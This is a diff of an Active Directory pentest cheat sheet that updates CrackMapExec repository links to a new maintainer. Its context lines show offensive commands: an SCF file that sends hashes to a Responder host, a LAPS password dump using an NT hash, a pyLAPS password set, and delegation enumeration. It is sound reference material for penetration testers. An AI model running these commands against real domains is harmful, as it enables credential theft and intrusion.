@@ -154,11 +154,11 @@
 * [Mimikatz](https://github.com/gentilkiwi/mimikatz)
 * [Ranger](https://github.com/funkandwagnalls/ranger)
 * [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
-* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
+* [CrackMapExec](https://github.com/mpgn/CrackMapExec)
 
   ```powershell
   # use the latest release, CME is now a binary packaged will all its dependencies
-  root@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip
+  root@payload$ wget https://github.com/mpgn/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip
 
   # execute cme (smb, winrm, mssql, ...)
   root@payload$ cme smb -L
@@ -1019,7 +1019,7 @@ IconFile=\\10.10.10.10\Share\test.ico
 Command=ToggleDesktop
 ```
 
-Using [`crackmapexec`](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/modules/slinky.py):
+Using [`crackmapexec`](https://github.com/mpgn/CrackMapExec/blob/master/cme/modules/slinky.py):
 
 ```ps1
 crackmapexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf
@@ -1568,7 +1568,7 @@ Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
        ./pyLAPS.py --action set --computer 'PC01$' -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1
        ```
      
-   * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec):
+   * [CrackMapExec](https://github.com/mpgn/CrackMapExec):
        ```bash
        crackmapexec smb 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps
        ```
@@ -3561,7 +3561,7 @@ Check the `TRUSTED_FOR_DELEGATION` property.
   grep TRUSTED_FOR_DELEGATION domain_computers.grep
   ```
 
-* [CrackMapExec module](https://github.com/byt3bl33d3r/CrackMapExec/wiki) 
+* [CrackMapExec module](https://github.com/mpgn/CrackMapExec/wiki) 
   ```powershell
   cme ldap 10.10.10.10 -u username -p password --trusted-for-delegation
   ```
